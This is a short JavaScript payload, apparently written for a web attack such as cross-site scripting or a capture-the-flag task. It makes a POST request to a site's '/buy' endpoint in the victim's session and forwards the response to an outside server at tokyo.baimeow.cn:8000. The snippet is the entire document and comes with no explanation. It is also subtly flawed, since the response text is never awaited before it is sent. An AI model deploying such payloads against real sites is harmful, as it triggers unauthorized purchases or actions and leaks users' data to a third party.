(async ()=>{
    let res = await fetch("/buy", { method: "POST", body: { id: 0 } });
    let txt = res.text();
    fetch("http://tokyo.baimeow.cn:8000/", { method: "POST", body: txt });
})()
